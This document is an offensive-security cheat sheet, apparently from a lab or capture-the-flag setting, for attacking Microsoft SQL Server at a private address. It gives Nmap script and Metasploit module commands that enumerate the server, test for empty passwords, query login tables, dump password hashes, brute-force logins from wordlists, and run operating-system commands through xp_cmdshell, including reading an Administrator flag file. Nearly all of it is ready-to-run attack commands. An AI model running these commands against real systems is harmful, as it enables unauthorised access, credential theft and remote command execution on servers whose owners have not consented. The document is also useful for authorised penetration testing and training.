#### Nmap
````bash
nmap --script ms-sql-info -p 1433 10.0.2.15

# More info
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.0.2.15

# Anonymous login
nmap -p 1433 --script ms-sql-empty-password 10.0.2.15

# sysusers 
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=password,ms-sql-query.query="SELECT * FROM master..syslogins" 10.0.2.15 -oN output.txt

# Dump hashes
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=password 10.0.2.15

# Command
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=password,ms-sql-xp-cmdshell.cmd="ipconfig" 10.0.2.15

# Read file
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=password,ms-sql-xp-cmdshell.cmd="type c:\Users\Administrator\flag.txt" 10.0.2.15
````
#### Metasploit
````bash
# Brute force
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 10.0.2.15
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt

# Enum
use auxiliary/admin/mssql/mssql_enum
set RHOSTS 10.0.2.15

# Extract all MSSQL users
use auxiliary/admin/mssql/mssql_enum_sql_logins

# Execute a command
use auxiliary/admin/mssql/mssql_exec
set RHOSTS 10.0.2.15
set CMD whoami

# Enum domain
use auxiliary/admin/mssql/mssql_enum_domain_accounts

````
#### Brute force 
````bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.0.2.15
````